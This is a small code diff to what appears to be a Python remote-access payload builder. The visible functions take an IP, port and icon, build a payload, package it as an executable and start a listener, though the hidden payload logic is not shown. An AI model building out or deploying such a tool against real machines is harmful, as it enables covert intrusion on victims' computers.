@@ -8,7 +8,7 @@ import ListenerSocketTiming
 import subprocess
 
 
-filepath = ""
+filepath = "Hi.txt"
 port = 12001
 ip_addr = socket.gethostbyname(socket.gethostname())
 
@@ -147,7 +147,7 @@ def liseners(ip, port):
 
 
 if __name__ == '__main__':
-    noExe = True
+    noEXE = True
 
     (filepath, name, Ip, port, icon) = console()
     payload(filepath, name, Ip, port)
@@ -156,8 +156,8 @@ if __name__ == '__main__':
         makeexe(name, icon)
     else:
         with open("variables.txt", "w") as f:
-            f.write(filepath)
-            f.write(port)
-            f.write(ip_addr)
+            f.write("filepath = " + filepath + "\n")
+            f.write("port = " + str(port) + "\n")
+            f.write("ip_address = " + ip_addr +"\n")
 
     liseners(Ip, port)
